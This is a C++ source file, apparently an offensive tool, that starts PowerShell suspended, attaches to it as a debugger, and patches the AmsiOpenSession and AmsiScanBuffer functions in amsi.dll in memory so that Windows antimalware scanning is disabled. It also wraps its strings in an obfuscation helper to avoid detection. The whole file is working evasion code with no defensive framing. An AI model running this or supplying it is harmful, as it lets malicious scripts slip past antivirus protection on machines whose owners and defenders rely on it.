#include "stuff.h"



template <typename I> std::string n2hexstr(I w, size_t hex_len = sizeof(I) << 1) {
    static const char* digits = "0123456789ABCDEF";
    std::string rc(hex_len, '0');
    for (size_t i = 0, j = (hex_len - 1) * 4; i < hex_len; ++i, j -= 4)
        rc[i] = digits[(w >> j) & 0x0f];
    return rc;
}
FARPROC GetFunctionAddressFromEAT(HANDLE hProcess, LPVOID baseAddress, const std::string& functionName)
{
    DWORD err;
    IMAGE_DOS_HEADER dosHeader;
    if (!ReadProcessMemory(hProcess, baseAddress, &dosHeader, sizeof(dosHeader), nullptr))
    {
        err = GetLastError();
        std::cout << h("[-] Failed to read IMAGE_DOS_HEADER: ") << err << h(" ") << GetWinapiErrorDescription(err) << std::endl;
        return nullptr;
    }

    IMAGE_NT_HEADERS ntHeader;
    if (!ReadProcessMemory(hProcess, reinterpret_cast<std::uint8_t*>(baseAddress) + dosHeader.e_lfanew, &ntHeader, sizeof(ntHeader), nullptr))
    {
        err = GetLastError();
        std::cout << h("[-] Failed to read IMAGE_NT_HEADERS") << err << h(" ") << GetWinapiErrorDescription(err) << std::endl;
        return nullptr;
    }

    IMAGE_EXPORT_DIRECTORY exportDirectory;
    if (!ReadProcessMemory(hProcess, reinterpret_cast<std::uint8_t*>(baseAddress) +
        ntHeader.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress,
        &exportDirectory, sizeof(exportDirectory), nullptr))
    {
        err = GetLastError();
        std::cout << h("[-] Failed to read IMAGE_EXPORT_DIRECTORY") << err << h(" ") << GetWinapiErrorDescription(err) << std::endl;
        return nullptr;
    }

    DWORD* functionAddresses = new DWORD[exportDirectory.NumberOfFunctions];
    ReadProcessMemory(hProcess, reinterpret_cast<std::uint8_t*>(baseAddress) + exportDirectory.AddressOfFunctions,
        functionAddresses, sizeof(DWORD) * exportDirectory.NumberOfFunctions, nullptr);

    DWORD* functionNames = new DWORD[exportDirectory.NumberOfNames];
    ReadProcessMemory(hProcess, reinterpret_cast<std::uint8_t*>(baseAddress) + exportDirectory.AddressOfNames,
        functionNames, sizeof(DWORD) * exportDirectory.NumberOfNames, nullptr);

    WORD* functionNameOrdinals = new WORD[exportDirectory.NumberOfNames];
    ReadProcessMemory(hProcess, reinterpret_cast<std::uint8_t*>(baseAddress) + exportDirectory.AddressOfNameOrdinals,
        functionNameOrdinals, sizeof(WORD) * exportDirectory.NumberOfNames, nullptr);

    FARPROC functionAddress = nullptr;
    for (DWORD i = 0; i < exportDirectory.NumberOfNames; ++i)
    {
        char name[256] = { 0 };
        ReadProcessMemory(hProcess, reinterpret_cast<std::uint8_t*>(baseAddress) + functionNames[i], name, sizeof(name), nullptr);
        if (functionName == name)
        {
            DWORD functionOrdinal = functionNameOrdinals[i];
            DWORD functionRelativeVirtualAddress = functionAddresses[functionOrdinal];
            functionAddress = reinterpret_cast<FARPROC>(reinterpret_cast<std::uint8_t*>(baseAddress) + functionRelativeVirtualAddress);
            break;
        }
    }


    delete[] functionAddresses;
    delete[] functionNames;
    delete[] functionNameOrdinals;

    return functionAddress;
}

std::string GetWinapiErrorDescription(DWORD errorCode) {
    LPSTR buffer = nullptr;

    DWORD result = FormatMessageA(
        FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
        NULL,
        errorCode,
        MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
        (LPSTR)&buffer,
        0,
        NULL);

    std::string errorDescription;
    if (result > 0 && buffer != nullptr) {
        errorDescription = buffer;
        LocalFree(buffer);
    }
    else {
        errorDescription = h("Unknown Error");
    }

    return errorDescription;
}

DWORD StartProcessSuspended(LPWSTR ProcName, HANDLE& hThread, HANDLE& hProc) {
    STARTUPINFO si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    si.cb = sizeof(STARTUPINFO);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_SHOWNORMAL;
    if (!CreateProcess(ProcName, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED | CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
        DWORD err = GetLastError();
        std::cout << h("[-] Cant Create Suspended Process : ") << err << " " << GetWinapiErrorDescription(err) << std::endl;
        return -1;
    }
    hThread = pi.hThread;
    hProc = pi.hProcess;

#ifdef DEBUG
    std::cout << h("[+] Process Created Successfully") << std::endl;
#endif

    return pi.dwProcessId;

}

int GetModuleSize(HANDLE hProcess, void* baseAddress)
{
    IMAGE_DOS_HEADER dosHeader;
    if (!ReadProcessMemory(hProcess, baseAddress, &dosHeader, sizeof(dosHeader), nullptr))
    {
        std::cout << "[-] Failed to read IMAGE_DOS_HEADER" << std::endl;
        return 0;
    }

    IMAGE_NT_HEADERS ntHeader;
    if (!ReadProcessMemory(hProcess, reinterpret_cast<std::uint8_t*>(baseAddress) + dosHeader.e_lfanew, &ntHeader, sizeof(ntHeader), nullptr))
    {
        std::cout << "[-] Failed to read IMAGE_NT_HEADERS" << std::endl;
        return 0;
    }

    return ntHeader.OptionalHeader.SizeOfImage;
}

int main() {
    setlocale(LC_ALL, "");
    LPWSTR pwsh = (LPWSTR)hW(L"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe");
    HANDLE hThread = NULL, hProc = NULL;
    DWORD pid = StartProcessSuspended(pwsh, hThread, hProc);
    if (pid == -1) {
        return -1;
    }

    DWORD wentwrong = GetLastError();
    if (hProc == NULL) {
        std::cout << h("[-] Cant Open Process Handle: ") << wentwrong << h(" ") << GetWinapiErrorDescription(wentwrong) << std::endl;
    }
#ifdef DEBUG
    std::cout << h("[+] Process Handle Opened SuccessFully") << std::endl;
#endif

    if (!DebugActiveProcess(pid))
    {
        DWORD err = GetLastError();
        std::cerr << h("[-] Failed to attach to process: ") << err << " " << GetWinapiErrorDescription(err) << std::endl;
        return 1;
    }

#ifdef DEBUG
    std::cout << h("[+] Attached to process with PID: ") << pid << std::endl;
#endif

    ResumeThread(hThread);
    DWORD dw = GetLastError();
    if (dw != 0) {
        std::cout << h("[-] Error resuming thread: ") << dw << " " << GetWinapiErrorDescription(dw) << std::endl;
        return -1;
    }

    HMODULE amsiBase = NULL;
    DEBUG_EVENT debugEvent;
    while (WaitForDebugEvent(&debugEvent, INFINITE))
    {
        switch (debugEvent.dwDebugEventCode) {
        case LOAD_DLL_DEBUG_EVENT:
            char szName[MAX_PATH];
            if (GetFinalPathNameByHandleA(debugEvent.u.LoadDll.hFile, szName, MAX_PATH, VOLUME_NAME_DOS))
            {
                if (strcmp(szName, h("\\\\?\\C:\\Windows\\System32\\amsi.dll")) == 0) {
                    std::cout << h("[+] AMSI Base Address: ") << debugEvent.u.LoadDll.lpBaseOfDll << std::endl;
                    amsiBase = (HMODULE)debugEvent.u.LoadDll.lpBaseOfDll;
                    SIZE_T size = GetModuleSize(hProc, amsiBase);
                    std::cout << h("[+] AMSI Size: ") << size << std::endl;
                    PVOID addr = GetFunctionAddressFromEAT(hProc, amsiBase, h("AmsiOpenSession"));

                    int values[3] = { 72, 49, 192 };
                    char patch[3];
                    std::ostringstream oss;
                    for (int i = 0; i < 3; i++) {
                        oss << std::hex << std::setw(2) << std::setfill('0') << values[i];
                        std::string hexValue = oss.str();
                        patch[i] = std::stoi(hexValue, nullptr, 16);
                        oss.str("");
                    }

                    WriteProcessMemory(hProc, addr, (PVOID)patch, 3, nullptr);
                    DWORD err1 = GetLastError();
                    if (err1 != 0) {
                        std::cout << h("[-] Error patching AmsiOpenSession: ") << err1 << h(" ") << GetWinapiErrorDescription(err1) << std::endl;

                    }

                    PVOID addr2 = GetFunctionAddressFromEAT(hProc, amsiBase, h("AmsiScanBuffer"));
                    int values2[6] = { 184, 87,0,7,128,195 };
                    char patch2[6];
                    std::ostringstream oss2;
                    for (int i = 0; i < 6; i++) {
                        oss2 << std::hex << std::setw(2) << std::setfill('0') << values2[i];
                        std::string hexValue2 = oss2.str();
                        patch2[i] = std::stoi(hexValue2, nullptr, 16);
                        oss2.str("");
                    }



                    WriteProcessMemory(hProc, addr2, (PVOID)patch2, 6, nullptr);
                    err1 = GetLastError();
                    if (err1 != 0) {
                        std::cout << h("[-] Error patching AmsiScanBuffer: ") << err1 << h(" ") << GetWinapiErrorDescription(err1) << std::endl;
                    }

                    std::cout << h("[+] Patching Complete") << std::endl;
                    goto me;
                }
            }
            CloseHandle(debugEvent.u.LoadDll.hFile);
            break;
        case EXIT_PROCESS_DEBUG_EVENT:
            break;
        }
        ContinueDebugEvent(debugEvent.dwProcessId, debugEvent.dwThreadId, DBG_CONTINUE);
    }

me:

    if (!DebugActiveProcessStop(pid))
    {
        DWORD ll = GetLastError();
        std::cerr << h("[-] Failed to detach from process: ") << ll << h(" ") << GetWinapiErrorDescription(ll) << std::endl;
        return -1;
    }

    std::cout << h("[+] Detached from process with PID: ") << pid << std::endl;

    CloseHandle(hProc);
    return 0;
}